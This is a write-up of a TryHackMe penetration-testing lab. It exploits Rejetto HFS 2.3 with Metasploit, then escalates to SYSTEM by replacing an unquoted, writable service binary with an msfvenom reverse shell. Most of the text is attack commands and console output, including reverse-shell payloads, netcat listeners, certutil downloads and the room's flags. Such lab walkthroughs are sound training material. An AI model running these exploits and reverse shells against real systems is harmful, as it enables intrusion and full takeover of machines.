#oscp #CTF

Today we are investigating a host which appears to be similar to Mr. Robot. This is one of the rooms from Tryhackme in the Penetration Testing path. 

I always like to start with some basic recon. The CTFs are not like a week long corporate engagement, but it is always good to follow best practice and keep some docs of some kind. At a min get the host info and store the nmap scans etc.

host is 10.x.x.x

Initial NMap Scan:
root@ip-x-x-x-x:~# nmap -sS -oN host.txt 10.x.x.x

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-15 00:16 BST
Nmap scan report for ip-10-x-x-x.eu-west-1.compute.internal (10.x.x.x)
Host is up (0.00047s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
MAC Address: 02:A3:2C:18:92:7F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 63.67 seconds

I have performed recon on the web server running on port 80.
There is an employee of the month. Both the file name and a reverse image search from tineye.com reveal that his name is Bill Harper (surprise)

I see another websever on port 8080.

Checking that out in the browser I see that it is running some non-standard http server called Rejetto HFS (http file server) running
 version 2.3.

Checking vulnerabilities via searchsploit find some available for that version so this server is suseptible to _CVE-2014-6287_

I have perfomed further nmap vulnerability scans and found a number of other vectors as well. The results are listed in nmap file under this directory.


Gaining Access:

I intend to use Metasploit.


_Note: Sorry guys I realize these are just private IPs but I am trying my best to protect THM's name space so I am removing them if I see them._
root@ip-x-x-x-x:~# msfconsole
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]                                                                                 
                                                                                                                                            
Metasploit tip: Search can apply complex filters such as search cve:2009 type:exploit, see all the filters with help search                 
                                                                                                                                            
msf5 > use exploit/windows/http/rejetto_hfs_exec                                                                                            
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                                    
msf5 exploit(windows/http/rejetto_hfs_exec) > show targets                                                                                  
                                                                                                                                            
Exploit targets:                                                                                                                            
                                                                                                                                            
   Id  Name                                                                                                                                 
   --  ----                                                                                                                                 
   0   Automatic                                                                                                                            


msf5 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file: PATH'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0
.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.x.x.x    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.x.x.x
RHOSTS => 10.x.x.x
msf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.193.132:4444 
[*] Using URL: http://0.0.0.0:8080/Csox9L
[*] Local IP: http://10.x.x.x:8080/Csox9L
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /Csox9L
[*] Sending stage (176195 bytes) to 10.x.x.x
[*] Meterpreter session 1 opened (10.x.x.x:4444 -> 10.x.x.x:49274) at 2022-10-15 01:05:19 +0100
[!] Tried to delete %TEMP%\ERrffScr.vbs, unknown result
[*] Server stopped.

meterpreter > shell
Process 1252 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

```
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A
```

Well, looks like we are in Bill's home Startup folder. Will check out his desktop

```
cd C:/Users/bill/Desktop

C:\Users\bill\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\Desktop

09/27/2019  09:08 AM    DIR          .
09/27/2019  09:08 AM    DIR          ..
09/27/2019  05:42 AM                70 user.txt
               1 File(s)             70 bytes
               2 Dir(s)  44,170,870,784 bytes free


C:\Users\bill\Desktop>type user.txt
type user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

Ok, so now we need to escalate our privileges. I did do a getsystem from meterpreter just to see if it worked, but nope ;)

This time we will use a familiar Powershell script called PowerUp.ps1 to help us achieve this.

Download from here:
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

msf5 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.x.x.x:4444 
[*] Using URL: http://0.0.0.0:8080/WeR5GlfgzUAbty
[*] Local IP: http://10.10.193.132:8080/WeR5GlfgzUAbty
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /WeR5GlfgzUAbty
[*] Sending stage (176195 bytes) to 10.10.164.184
[*] Meterpreter session 3 opened (10.10.193.132:4444 -> 10.10.164.184:49313) at 2022-10-15 01:32:37 +0100
[*] Server stopped.
[!] This exploit may require manual cleanup of '%TEMP%\lBDYwhYfmYjiwi.vbs' on the target

meterpreter > 
[!] Tried to delete %TEMP%\lBDYwhYfmYjiwi.vbs, unknown result

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell

```
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path HijackPath
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path HijackPath
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path HijackPath
CanRestart     : True


Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path HijackPath
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path HijackPath
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path HijackPath
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

ServiceName    : IObitUnSvr
Path           : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'IObitUnSvr' -Path HijackPath
CanRestart     : False
Name           : IObitUnSvr
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path HijackPath
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path HijackPath
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName    : LiveUpdateSvc
Path           : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'LiveUpdateSvc' -Path HijackPath
CanRestart     : False
Name           : LiveUpdateSvc
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

ServiceName                     : IObitUnSvr
Path                            : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'IObitUnSvr'
CanRestart                      : False
Name                            : IObitUnSvr
Check                           : Modifiable Service Files

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files
```

Now the idea here is to generate an exploit with msfvenom and replace the process we have access to restart with a reverse shell. This process
 also has nt authority\system so we should be able to own the box then and get the flag.

Generate shell:
msfvenom -p windows/shell_reverse_tcp LHOST=10.x.x.x LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe

_Note: Go ahead and name the .exe as the service executable that we want to replace so when we upload it, we can save time_

From powershell get to the working directory of ASCService.exe
Then we need to stop the Service:

Stop-Service AdvancedSystemCareService9
Get-Service  - Shows all service status

Now background our PS Ctrl-Z

from the meterpreter prompt CD to the working directory for the ASCService.
C:\Program Files (x86)\IObit\Advanced CareService

run: 
upload /root/ASCService.exe   (note the 15k small file size and verify after upload)

load the session again or if it died (mine did again and again and again and again. pe no saco)
powershell_shell


On your local Hack box run:
_nc -lnvp 4443_


_Note - I kept dropping meterpreter sessions here. I realized later it was because the exploit we uploaded from msfvenom is very unstable. If you look when it runs it basically gets you a shell but kills the service. So you have 2 choices.

_You can run a post payload multi/handler for meterpreter to pick up the callback but you have to type really fast before windows cleans up the dead ASCService process or just do it simply like I did above with netcat ;) Gotta work smarter not harder. Besides, a good sysadmin is a lazy sysadmin (think about it)_

Then from your powershell shell run:
Restart-Service AdvancedSystemCareService9 

You should now have a reverse shell with full privs.
The root file is under /Users/Administrator/Desktop/root.txt

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
C:\Users\Administrator\Desktop>
```

For the last section I will attempt to access the system using the same CVE, but without the aide of metasploit.

For the last part it's basically just a repeat but we aren't using Meterpreter.

You just need to download the Python script:

https://www.exploit-db.com/exploits/39161

Then modify a few variables in it:

```py
	ip_addr = "192.168.44.128" #local IP address
	local_port = "4444" # Local Port number
```

Just make it your local IP for your tun0 address or if using an Attackbox then use the IP for eth0.

Now you can setup a listener in another terminal:

```
nc -nlvp 4444
```

Next download the static binary nc.exe from here:
https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe

Then in another Terminal Window we can host a Simple webserver

```
python3 -m http.server
```

_make sure your nc static binary is located in the same directory as where you executed the http server_

Now simply run the python attack script to exploit. You will need to run it twice. 

The first time will check and see if the nc.exe already exists locally. If it doesn't it will download it from the webserver you setup, otherwise when you run it the 2nd time or if it finds the nc.exe then it will run the reverse shell which you will catch using the listener you setup on 4444.

The steps are the same to get the flag for Bill, but you will run Winpeas this time to find an esalation path.

So again pull down the WinPeas and then CD into that locally:

```
cd ~/Tools/winPEAS
```

Execute a web server:

```
python -m SimpleHTTPServer 80
```

Now back in your Windows shell pull the file.

```
certutil -urlcache -f http://10.x.x.x/winPEASx64.exe winpeas.exe

**** ONLINE ****
CertUtil: URLCache command completed successfully.
```

Then run it:

```
C:\Temp>. \winpeas.exe
```

_note - you can run winpeas with an option like 'servicesinfo' so you don't get hammered with Too much information IF you know kinda what you are looking for
You can read  more here:
https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md

```
winpeas.exe #run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed
winpeas.exe notcolor #Do not color the output
winpeas.exe domain #enumerate also domain information
winpeas.exe wait #wait for user input between tests
winpeas.exe debug #display additional debug information
winpeas.exe log #log output to out.txt instead of standard output
winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh #Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
winpeas.exe -lolbas  #Execute also additional LOLBAS search check
```

[?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-priviledge-escalation#services
	AdvancedSystemCareService9(Apache Software Foundation - Advanced SystemCare Service 9)[C:\Program Files (x86)\IOBit\Advanced SystemCare\ASCService.exe] - Auto - Stopped  - No quotes and space detected

So it does find this issue.

The rest of this challenge is pretty much the same as it was before. You can setup the an HTTP server locally to host your compromised version of ASCService.exe then use msfconsole

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
show/set options
LHOST=tun0
LPORT=4443 (pick one you haven't used already :P)
run

_note you can run the -j option should fork it off as a job_

You can run:
```
powershell -c "Get-Service"
```

That was the answer for the last question btw. It's helpfull to know that when using the Get-Service, Start-Service, Stop-Service or Restart-Service commands.

You can also use:
```
sc start AdvancedSystemCareService9
```

Once you replace the ASCService.exe and restart it then you should get your reverse shell only this time you will have the nt authority/system privs to nagivate down to
```
C:/Users/Administrator/Desktop

type root.txt
```

That's about it for this room.